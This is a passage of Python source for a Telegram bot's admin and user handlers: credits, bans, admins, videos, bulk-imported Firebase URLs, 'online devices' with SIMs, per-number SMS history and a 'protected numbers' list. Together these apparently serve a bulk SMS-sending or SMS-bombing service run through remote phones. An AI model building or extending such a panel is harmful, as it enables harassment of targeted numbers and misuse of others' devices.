    except Exception as e:
        log.error(f"Failed to edit final progress: {e}")

@R.callback_query(F.data == "user:stop_send")
async def user_stop_send(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    async with SESSIONS_LOCK:
        session = USER_SESSIONS.get(uid)
        if not session or (session.task and session.task.done()):
            await cq.answer("✅ Sending already complete!", show_alert=True); return
        session.cancelled = True
    await cq.answer("🛑 Stop signal bhej diya!", show_alert=True)
    try:
        async with session.lock:
            cs = session.sent; cf = session.failed
        await cq.message.edit_text(
            f"🛑 <b>Stopping...</b>\n\n✅ Sent: <b>{cs}</b>\n❌ Failed: <b>{cf}</b>",
            parse_mode="HTML")
    except Exception: pass

@R.callback_query(F.data == "owner:videos:menu")
async def owner_videos_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True); return
    videos = d.get("videos", [])
    await cq.message.edit_text(
        f"📹 <b>Video Manager</b>\n\nTotal Videos: <b>{len(videos)}</b>",
        reply_markup=videos_menu_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "owner:videos:add")
async def owner_videos_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True); return
    await state.set_state(S.add_video)
    await cq.message.edit_text(f"📹 <b>Add Video</b>\n\nVideo bhejiye ya File ID:",
                               reply_markup=kb([(f"{sc('cancel')}", "owner:videos:menu")]), parse_mode="HTML")

@R.message(S.add_video)
async def owner_videos_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        await state.clear(); return
    vfid = None
    if msg.video: vfid = msg.video.file_id
    elif msg.document and msg.document.mime_type and msg.document.mime_type.startswith("video"): vfid = msg.document.file_id
    elif msg.text: vfid = msg.text.strip()
    if not vfid:
        await msg.answer("❌ Valid Video send karein.", parse_mode="HTML"); return
    d.setdefault("videos", []).append(vfid)
    save(d)
    await state.clear()
    await msg.answer(f"✅ <b>Video Saved!</b>", reply_markup=videos_menu_kb(load()), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:videos:del:"))
async def owner_videos_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True); return
    idx = int(cq.data.split("owner:videos:del:", 1)[1])
    videos = d.get("videos", [])
    if 0 <= idx < len(videos):
        videos.pop(idx); d["videos"] = videos; save(d)
        await cq.answer("🗑 Video Removed!")
    await owner_videos_menu(cq, state)

@R.callback_query(F.data == "owner:videos:bulk_del")
async def owner_videos_bulk_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True); return
    d["videos"] = []; save(d)
    await cq.answer("🗑 All Videos Deleted!", show_alert=True)
    await owner_videos_menu(cq, state)

@R.callback_query(F.data == "user:random_video")
async def user_trigger_video(cq: CallbackQuery, state: FSMContext):
    d = load()
    videos = d.get("videos", [])
    if not videos:
        await cq.answer("❌ Koi video nahi hai!", show_alert=True); return
    await cq.answer("📹 Sending video...")
    await send_random_video(cq.bot, cq.message.chat.id, caption=f"📹 Enjoy!")

@R.callback_query(F.data == "owner:protect")
async def owner_protect_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    await state.set_state(S.protect_number)
    await cq.message.edit_text(f"🔒 <b>Protect Number</b>\n\nNumber bhejo:",
                               reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")

@R.message(S.protect_number)
async def owner_protect_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear(); return
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer("❌ Invalid number:", parse_mode="HTML"); return
    PROTECTED_NUMBERS[number] = uid
    d["protected_numbers"] = PROTECTED_NUMBERS
    save(d)
    await state.clear()
    await msg.answer(f"🔒 <b>Number Protected!</b>\n\n📞 <code>{number}</code>",
                     reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
    log_activity(d, "number_protected", uid, f"Protected {number}")

@R.callback_query(F.data == "owner:protected_list")
async def owner_protected_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d) and not is_admin(uid, d):
        await cq.answer("🚫 Access denied!", show_alert=True); return
    protected = d.get("protected_numbers", {})
    if not protected:
        await cq.message.edit_text(f"🔐 <b>Protected List</b>\n\n❌ Koi protected nahi.",
                                   reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML"); return
    lines = [f"🔐 <b>Protected Numbers List</b>\n\n"]
    is_owner_user = is_owner(uid, d) or is_main_owner(uid)
    for number, protector_uid in protected.items():
        dn = number if is_owner_user else mask_number(number)
        pd = d.get("users", {}).get(str(protector_uid), {})
        pn = pd.get("name", "Unknown")
        lines.append(f"📞 <code>{dn}</code>\n   🔒 By: <code>{protector_uid}</code> ({pn})\n")
    rows = []
    if is_owner_user:
        rows.append([btn("ʀᴇᴍᴏᴠᴇ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ", "owner:protected_remove", None, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", None, "🔙")])
    await cq.message.edit_text("\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:protected_remove")
async def owner_protected_remove_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d) and not is_main_owner(uid):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    protected = d.get("protected_numbers", {})
    if not protected:
        await cq.answer("❌ Koi protected nahi!", show_alert=True); return
    rows = []
    for number, _ in protected.items():
        rows.append([btn(number, f"owner:protected_del:{number}", None, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:protected_list", None, "🔙")])
    await cq.message.edit_text(f"🗑 <b>Remove Protected</b>\n\nKaunsa?",
                               reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:protected_del:"))
async def owner_protected_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d) and not is_main_owner(uid):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    number = cq.data.split("owner:protected_del:", 1)[1]
    if number in d.get("protected_numbers", {}):
        del d["protected_numbers"][number]; save(d)
        global PROTECTED_NUMBERS
        PROTECTED_NUMBERS = d["protected_numbers"]
        await cq.answer(f"✅ Removed {number}!", show_alert=True)
    else:
        await cq.answer("❌ Not found!", show_alert=True)
    await owner_protected_list(cq, state)

@R.callback_query(F.data == "owner:track")
async def owner_track_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    await state.set_state(S.track_number)
    await cq.message.edit_text(f"📍 <b>Number Tracker</b>\n\nNumber bhejo:",
                               reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")

@R.message(S.track_number)
async def owner_track_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear(); return
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer("❌ Invalid number:", parse_mode="HTML"); return
    await state.clear()
    all_history = d.get("sms_history", {})
    users_who_sent = []
    for uid_str, history_list in all_history.items():
        for entry in history_list:
            if entry.get("number") == number:
                ud = d.get("users", {}).get(uid_str, {})
                users_who_sent.append({"uid": int(uid_str), "name": ud.get("name", "Unknown"),
                                       "timestamp": entry.get("timestamp", 0)})
                break
    if not users_who_sent:
        await msg.answer(f"📍 <b>Number Tracker</b>\n\n📞 <code>{number}</code>\n\n❌ Kisi ne nahi bheja.",
                         reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML"); return
    lines = [f"📍 <b>Number Tracker</b>\n\n📞 <code>{number}</code>\n\n👥 <b>Users:</b>\n"]
    for entry in users_who_sent:
        lines.append(f"• <code>{entry['uid']}</code> — {entry['name'][:20]} — {fmt_time(entry['timestamp'])}")
    await msg.answer("\n".join(lines), reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")

@R.callback_query(F.data == "owner:add_all_credits")
async def owner_add_all_credits_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    await state.set_state(S.add_all_credits_amount)
    await cq.message.edit_text(f"💰 <b>Add Credits to ALL Users</b>\n\nKitne?",
                               reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")

@R.message(S.add_all_credits_amount)
async def owner_add_all_credits_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear(); return
    try:
        amount = int(msg.text.strip())
        if amount <= 0: raise ValueError
    except:
        await msg.answer("❌ Valid positive number bhejo.", parse_mode="HTML"); return
    await state.clear()
    users = d.get("users", {})
    if not users:
        await msg.answer("❌ Koi user nahi!", reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML"); return
    count = 0
    for uid_str in users:
        add_credits(int(uid_str), amount, d); count += 1
    save(d)
    notif = f"💰 <b>Credits Added!</b>\n\n🎉 +{amount} credits mile!\n💳 Check /start"
    success = 0
    for uid_str in users:
        try:
            await msg.bot.send_message(int(uid_str), notif, parse_mode="HTML")
            success += 1; await asyncio.sleep(0.05)
        except: pass
    await msg.answer(f"✅ <b>Added to All!</b>\n\n💰 {amount} each\n👥 Total: <b>{count}</b>\n📨 Notified: <b>{success}</b>",
                     reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
    log_activity(d, "add_credits_all", uid, f"Added {amount} to {count} users")

@R.callback_query(F.data == "owner:deduct_all_credits")
async def owner_deduct_all_credits_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    await state.set_state(S.deduct_all_credits_amount)
    await cq.message.edit_text(f"💸 <b>Deduct Credits from ALL</b>\n\nKitne katne?",
                               reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")

@R.message(S.deduct_all_credits_amount)
async def owner_deduct_all_credits_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear(); return
    try:
        amount = int(msg.text.strip())
        if amount <= 0: raise ValueError
    except:
        await msg.answer("❌ Valid positive number:", parse_mode="HTML"); return
    await state.clear()
    users = d.get("users", {})
    if not users:
        await msg.answer("❌ Koi user nahi!", reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML"); return
    count = 0; td = 0
    owners = d.get("owners", [MAIN_OWNER])
    admins = d.get("admins", [])
    for uid_str, udata in users.items():
        user_id = int(uid_str)
        if user_id in owners or user_id in admins: continue
        current = udata.get("credits", 0)
        if current >= amount:
            udata["credits"] = current - amount; count += 1; td += amount
        elif current > 0:
            udata["credits"] = 0; count += 1; td += current
    save(d)
    await msg.answer(f"✅ <b>Deducted!</b>\n\n💰 {amount} each\n👥 Affected: <b>{count}</b>\n💳 Total: <b>{td}</b>\n👑 Owners/Admins: Skipped",
                     reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
    log_activity(d, "deduct_credits_all", uid, f"Deducted {td} from {count}")

@R.callback_query(F.data == "user:transfer")
async def user_transfer_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if is_banned(uid, d):
        await cq.answer("🚫 Banned!", show_alert=True); return
    if not can_use(uid, d):
        await cq.answer("⛔ No access!", show_alert=True); return
    cc = get_user_credits(uid, d)
    if cc < 2:
        await cq.answer("❌ Min 2 credits chahiye!", show_alert=True); return
    await state.set_state(S.transfer_credits_uid)
    await cq.message.edit_text(
        f"💸 <b>Transfer Credits</b>\n\n💰 Your: <b>{cc}</b>\n⚠️ Aap half hi transfer kar sakte hain!\n\n"
        f"{sc('step 1/2')}: Target User ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]), parse_mode="HTML")

@R.message(S.transfer_credits_uid)
async def user_transfer_uid(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    try: target_uid = int(msg.text.strip())
    except:
        await msg.answer("❌ Valid User ID bhejo:", parse_mode="HTML"); return
    if target_uid == uid:
        await msg.answer("❌ Apne aap ko nahi!", parse_mode="HTML"); return
    if str(target_uid) not in d.get("users", {}):
        await msg.answer("❌ User ID exist nahi karta!", parse_mode="HTML"); return
    cc = get_user_credits(uid, d)
    if cc < 2:
        await msg.answer("❌ Min 2 credits!", parse_mode="HTML"); return
    await state.update_data(transfer_target=target_uid)
    await state.set_state(S.transfer_credits_amount)
    half = cc // 2
    await msg.answer(f"💸 <b>{sc('step 2/2')}</b>\n\n👤 Target: <code>{target_uid}</code>\n💰 Your: <b>{cc}</b>\n📤 Max: <b>{half}</b>\n\nKitne?",
                     reply_markup=kb([(f"{sc('cancel')}", "user:home")]), parse_mode="HTML")

@R.message(S.transfer_credits_amount)
async def user_transfer_amount(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    try:
        amount = int(msg.text.strip())
        if amount <= 0: raise ValueError
    except:
        await msg.answer("❌ Valid positive number:", parse_mode="HTML"); return
    fsmd = await state.get_data()
    target_uid = fsmd.get("transfer_target")
    cc = get_user_credits(uid, d)
    mt = cc // 2
    if amount > mt:
        await msg.answer(f"❌ Max {mt} transfer kar sakte hain!", parse_mode="HTML"); return
    if not deduct_credits(uid, amount, d):
        await msg.answer("❌ Insufficient!", parse_mode="HTML"); return
    add_credits(target_uid, amount, d); save(d)
    await state.clear()
    try:
        await msg.bot.send_message(target_uid,
            f"💸 <b>Credits Received!</b>\n\n👤 From: <code>{uid}</code>\n💰 Amount: <b>{amount}</b>\n💳 Balance: <b>{get_user_credits(target_uid, d)}</b>",
            parse_mode="HTML")
    except: pass
    await msg.answer(f"✅ <b>Transfer Successful!</b>\n\n👤 To: <code>{target_uid}</code>\n💰 {amount}\n💳 Your Balance: <b>{get_user_credits(uid, d)}</b>",
                     reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
    log_activity(d, "credit_transfer", uid, f"Transferred {amount} to {target_uid}")

@R.callback_query(F.data.in_({"owner:home", "owner:refresh"}))
async def owner_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    if cq.data == "owner:refresh":
        await cq.answer("🔄 Refreshing...", show_alert=False)
        try: await run_firebase_scan_once(cq.bot)
        except Exception as e: log.error(f"Refresh error: {e}")
        d = load()
    else:
        await cq.answer()
    try:
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    except TelegramBadRequest: pass

@R.callback_query(F.data.startswith("owner:fb:menu"))
async def owner_fb_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    await state.clear()
    parts = cq.data.split(":")
    page = int(parts[3]) if len(parts) > 3 else 0
    await cq.message.edit_text(
        f"🔥 <b>Firebase Manager</b>\n\nTotal: <b>{len(d.get('firebases', []))}</b>",
        reply_markup=fb_menu_kb(d, page), parse_mode="HTML")

@R.callback_query(F.data == "owner:fb:add")
async def owner_fb_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    await state.set_state(S.add_firebase)
    await cq.message.edit_text(
        f"🔥 <b>Add Firebase</b>\n\n<i>Format: Label | URL</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fb:menu:0")]), parse_mode="HTML")

@R.message(S.add_firebase)
async def owner_fb_add_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear(); return
    text = msg.text.strip()
    if "|" in text:
        parts = text.split("|", 1)
        label = parts[0].strip(); url = parts[1].strip()
    else:
        url = text; label = url.replace("https://", "").split(".")[0][:20]
    if not url.startswith("http"):
        await msg.answer("❌ URL https:// se start hona chahiye!", parse_mode="HTML"); return
    url = url.rstrip("/")
    fbs = d.get("firebases", [])
    if any(fb["url"] == url for fb in fbs):
        await state.clear()
        await msg.answer("⚠️ Already added!", reply_markup=fb_menu_kb(d), parse_mode="HTML"); return
    fb_id = str(int(time.time()))
    fbs.append({"id": fb_id, "url": url, "label": label, "added_at": int(time.time())})
    d["firebases"] = fbs; save(d)
    await state.clear()
    await msg.answer(f"✅ <b>Firebase Added!</b>\n\n🏷 {label}\n🔗 <code>{url}</code>",
                     reply_markup=fb_menu_kb(load()), parse_mode="HTML")

@R.callback_query(F.data == "owner:fb:add_file")
async def owner_fb_add_file_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    await state.set_state(S.add_firebase_file)
    await cq.message.edit_text(f"📄 <b>Bulk Add via TXT</b>\n\nTXT file bhejo:",
                               reply_markup=kb([(f"{sc('cancel')}", "owner:fb:menu:0")]), parse_mode="HTML")

@R.message(S.add_firebase_file, F.document)
async def owner_fb_add_file_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    doc = msg.document
    if not doc.file_name.endswith('.txt'):
        await msg.answer("❌ Sirf .txt file!", parse_mode="HTML"); return
    fi = await msg.bot.get_file(doc.file_id)
    df = await msg.bot.download_file(fi.file_path)
    content = df.read().decode('utf-8', errors='ignore')
    lines = content.splitlines()
    fbs = d.get("firebases", [])
    existing_urls = {fb["url"].rstrip("/") for fb in fbs}
    added = 0; skipped = 0; pf = set()
    for line in lines:
        line = line.strip()
        if not line: continue
        if "|" in line:
            parts = line.split("|", 1); label = parts[0].strip(); url = parts[1].strip()
        else:
            url = line; label = url.replace("https://", "").replace("http://", "").split(".")[0][:20]
        if not (url.startswith("http://") or url.startswith("https://")): continue
        url = url.rstrip("/")
        if url in existing_urls or url in pf:
            skipped += 1; continue
        pf.add(url); existing_urls.add(url)
        fb_id = str(int(time.time() * 1000) + random.randint(100, 999))
        fbs.append({"id": fb_id, "url": url, "label": label, "added_at": int(time.time())})
        added += 1
    d["firebases"] = fbs; save(d)
    await state.clear()
    await msg.answer(f"✅ <b>TXT Processed!</b>\n\n🔥 Added: <b>{added}</b>\n⚠️ Skipped: <b>{skipped}</b>\n📊 Total: <b>{len(fbs)}</b>",
                     reply_markup=fb_menu_kb(load()), parse_mode="HTML")

@R.message(S.add_firebase_file)
async def owner_fb_add_file_invalid(msg: Message):
    await msg.answer("❌ Valid .txt document bhejo!", parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:fb:del:"))
async def owner_fb_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    parts = cq.data.split(":")
    fb_id = parts[3]
    page = int(parts[4]) if len(parts) > 4 else 0
    d["firebases"] = [fb for fb in d["firebases"] if fb["id"] != fb_id]; save(d)
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") != fb_id]
    FB_DEVICE_COUNTS.pop(fb_id, None)
    await cq.answer("🗑 Removed!")
    d = load()
    await cq.message.edit_text(f"🔥 <b>Firebase Manager</b>\n\nTotal: <b>{len(d['firebases'])}</b>",
                               reply_markup=fb_menu_kb(d, page), parse_mode="HTML")

@R.callback_query(F.data == "owner:stats")
async def owner_stats_cb(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    await cq.answer("⏳ Fetching...")
    current_fb_ids = {fb["id"] for fb in d.get("firebases", [])}
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") in current_fb_ids]
    stale = [k for k in FB_DEVICE_COUNTS if k not in current_fb_ids]
    for k in stale: FB_DEVICE_COUNTS.pop(k, None)
    devices = get_cached_devices()
    if not devices: devices = await get_all_online_devices(d)
    stats_text = api_stats_text(d)
    dev_lines = [f"\n🟢 <b>Online Devices ({len(devices)})</b>\n"]
    if not devices: dev_lines.append("  😴 Koi online nahi")
    for dv in devices:
        dev_lines.append(f"  📱 <b>{dv['dev_name'][:20]}</b>\n     🔥 {dv['fb_label'][:25]}\n     📶 SIMs: {len(dv['sims']) or 1}")
    full = stats_text + "\n" + "\n".join(dev_lines)
    if len(full) > 4000: full = full[:3990] + "\n<i>...truncated</i>"
    await cq.message.edit_text(full, reply_markup=kb([(f"{sc('refresh')}", "owner:stats"), (f"{sc('back')}", "owner:home")]), parse_mode="HTML")

@R.callback_query(F.data == "owner:owners:menu")
async def owner_owners_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    owners = d.get("owners", [])
    await cq.message.edit_text(f"👑 <b>Super Admins</b>\n\nTotal: <b>{len(owners)}/6</b>",
                               reply_markup=owners_menu_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "owner:owners:add")
async def owner_owners_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    if len(d.get("owners", [])) >= 6:
        await cq.answer("❌ Max 6!", show_alert=True); return
    await state.set_state(S.add_owner)
    await cq.message.edit_text(f"👑 <b>Add Super Admin</b>\n\nChat ID bhejo:",
                               reply_markup=kb([(f"{sc('cancel')}", "owner:owners:menu")]), parse_mode="HTML")

@R.message(S.add_owner)
async def owner_owners_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try: new_id = int(msg.text.strip())
    except:
        await msg.answer("❌ Valid Chat ID:", parse_mode="HTML"); return
    if is_owner(new_id, d):
        await state.clear()
        await msg.answer("⚠️ Already super admin!", reply_markup=owners_menu_kb(d), parse_mode="HTML"); return
    if len(d.get("owners", [])) >= 6:
        await state.clear()
        await msg.answer("❌ Max 6!", reply_markup=owners_menu_kb(d), parse_mode="HTML"); return
    d["owners"].append(new_id); save(d)
    await state.clear()
    await msg.answer(f"✅ <b>Super Admin Added!</b>\n<code>{new_id}</code>",
                     reply_markup=owners_menu_kb(load()), parse_mode="HTML")
    try:
        await msg.bot.send_message(new_id, "🔱 Aapko Super Admin banaya gaya! /start karein.", parse_mode="HTML")
    except: pass

@R.callback_query(F.data.startswith("owner:owners:del:"))
async def owner_owners_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    del_id = int(cq.data.split("owner:owners:del:", 1)[1])
    if not is_owner(uid, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    if del_id == MAIN_OWNER or del_id in SUPER_ADMINS:
        await cq.answer("❌ Main owner remove nahi ho sakta!", show_alert=True); return
    if del_id in d["owners"]:
        d["owners"].remove(del_id); save(d)
        await cq.answer("🗑 Removed!")
    await cq.message.edit_text(f"👑 <b>Owners</b>\n\nTotal: <b>{len(d['owners'])}/6</b>",
                               reply_markup=owners_menu_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "owner:admins:menu")
async def owner_admins_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    await cq.message.edit_text(f"🛡 <b>Admins</b>\n\nTotal: <b>{len(d.get('admins', []))}</b>",
                               reply_markup=admins_menu_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "owner:admins:add")
async def owner_admins_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    await state.set_state(S.add_admin)
    await cq.message.edit_text(f"🛡 <b>Add Admin</b>\n\nUser ID bhejo:",
                               reply_markup=kb([(f"{sc('cancel')}", "owner:admins:menu")]), parse_mode="HTML")

@R.message(S.add_admin)
async def owner_admins_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try: new_id = int(msg.text.strip())
    except:
        await msg.answer("❌ Valid ID:", parse_mode="HTML"); return
    if new_id in d.get("admins", []) or is_owner(new_id, d):
        await state.clear()
        await msg.answer("⚠️ Already admin/owner!", reply_markup=admins_menu_kb(d), parse_mode="HTML"); return
    d["admins"].append(new_id); save(d)
    await state.clear()
    await msg.answer(f"✅ <b>Admin Added!</b>\n<code>{new_id}</code>",
                     reply_markup=admins_menu_kb(load()), parse_mode="HTML")
    try:
        await msg.bot.send_message(new_id, "🛡 Aapko Admin banaya gaya! /start karein.", parse_mode="HTML")
    except: pass

@R.callback_query(F.data.startswith("owner:admins:del:"))
async def owner_admins_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    del_id = int(cq.data.split("owner:admins:del:", 1)[1])
    if not is_owner(uid, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    if del_id in d.get("admins", []):
        d["admins"].remove(del_id); save(d)
        await cq.answer("🗑 Removed!")
    await cq.message.edit_text(f"🛡 <b>Admins</b>\n\nTotal: <b>{len(d['admins'])}</b>",
                               reply_markup=admins_menu_kb(d), parse_mode="HTML")

@R.callback_query(F.data.in_({"owner:free:on", "owner:free:off"}))
async def owner_free_toggle(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    d["free_mode"] = (cq.data == "owner:free:on")
    save(d); d = load()
    mode = "🟢 FREE MODE ON" if d["free_mode"] else "🔴 Approval Required"
    await cq.answer(f"Done! {mode}", show_alert=True)
    try: await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    except TelegramBadRequest: pass

@R.callback_query(F.data.in_({"owner:users:list", "admin:users:list"}))
async def panel_users_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    prefix = "owner" if is_owner(uid, d) else "admin"
    if not is_admin(uid, d):
        await cq.answer("🚫 Access Denied!", show_alert=True); return
    text, markup = users_list_kb(d, prefix, 0)
    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")

@R.callback_query(F.data.regexp(r"^(owner|admin):users:pg:(\d+)$"))
async def panel_users_page(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫 Access Denied!", show_alert=True); return
    parts = cq.data.split(":")
    prefix = parts[0]; page = int(parts[3])
    text, markup = users_list_kb(d, prefix, page)
    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")

@R.callback_query(F.data.in_({"owner:ban", "admin:ban"}))
async def panel_ban_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True); return
    await state.set_state(S.ban_user)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await cq.message.edit_text(f"🚫 <b>Ban User</b>\n\nUser ID bhejo:",
                               reply_markup=kb([(f"{sc('cancel')}", back)]), parse_mode="HTML")

@R.message(S.ban_user)
async def panel_ban_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await state.clear(); return
    try: ban_id = int(msg.text.strip())
    except:
        await msg.answer("❌ Valid ID:", parse_mode="HTML"); return
    if is_owner(ban_id, d) or is_admin(ban_id, d):
        await state.clear()
        await msg.answer("❌ Admin/Owner ko ban nahi!", parse_mode="HTML"); return
    if ban_id not in d.get("banned", []):
        d.setdefault("banned", []).append(ban_id); save(d)
    await state.clear()
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await msg.answer(f"🚫 <b>Banned!</b>\n<code>{ban_id}</code>", reply_markup=back_kb, parse_mode="HTML")
    try: await msg.bot.send_message(ban_id, "🚫 Aapko ban kar diya gaya.", parse_mode="HTML")
    except: pass

@R.callback_query(F.data.in_({"owner:unban:menu", "admin:unban:menu"}))
async def panel_unban_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True); return
    banned = d.get("banned", [])
    if not banned:
        await cq.answer("✅ Koi banned nahi!", show_alert=True); return
    prefix = "owner" if is_owner(cq.from_user.id, d) else "admin"
    await cq.message.edit_text(f"🔓 <b>Unban User</b>\n\nBanned: <b>{len(banned)}</b>",
                               reply_markup=unban_menu_kb(d, prefix), parse_mode="HTML")

@R.callback_query(F.data.regexp(r"^(owner|admin):unban:do:(\d+)$"))
async def panel_unban_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫 Access Denied!", show_alert=True); return
    ban_id = int(cq.data.split(":")[-1])
    if ban_id in d.get("banned", []):
        d["banned"].remove(ban_id); save(d)
    await cq.answer(f"✅ Unbanned!", show_alert=True)
